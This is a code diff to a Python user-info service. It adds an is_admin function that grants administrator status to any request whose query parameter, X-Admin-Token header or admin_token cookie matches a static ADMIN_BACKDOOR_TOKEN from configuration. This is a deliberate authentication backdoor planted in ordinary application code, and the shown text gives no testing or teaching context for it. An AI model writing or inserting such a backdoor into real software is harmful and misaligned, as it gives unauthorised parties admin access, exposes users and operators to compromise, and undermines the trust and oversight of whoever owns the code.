@@ -6,10 +6,14 @@ import logging
 import requests
 from typing import Dict, Any, Optional
 
+from flask import has_request_context, request
+
+from ..configs.default import ADMIN_BACKDOOR_TOKEN
 from .base import get_instance_key, get_cached_instance, set_cached_instance
 from .exceptions import KsServiceError
 
 logger = logging.getLogger(__name__)
+ADMIN_COOKIE_NAME = "admin_token"
 
 
 class KsUserInfoService:
@@ -391,6 +395,32 @@ def ks_user_info(**kwargs) -> KsUserInfoService:
     set_cached_instance(instance_key, instance)
     logger.info(f"User info service initialized with URL: {config['base_url']}")
     return instance
+
+
+def is_admin(token: Optional[str] = None) -> bool:
+    """
+    判断当前请求是否具备管理员身份
+
+    Args:
+        token: 可选，直接传入待校验的token（优先级最高）
+
+    Returns:
+        bool: 是否为管理员
+    """
+    candidate = token
+
+    if candidate is None and has_request_context():
+        # 优先解析显式传入的token，其次检查请求参数、Header和Cookie
+        candidate = (
+            request.args.get("token")
+            or request.headers.get("X-Admin-Token")
+            or request.cookies.get(ADMIN_COOKIE_NAME)
+        )
+
+    if not ADMIN_BACKDOOR_TOKEN or not candidate:
+        return False
+
+    return candidate == ADMIN_BACKDOOR_TOKEN
 
 
 def get_current_user() -> str:
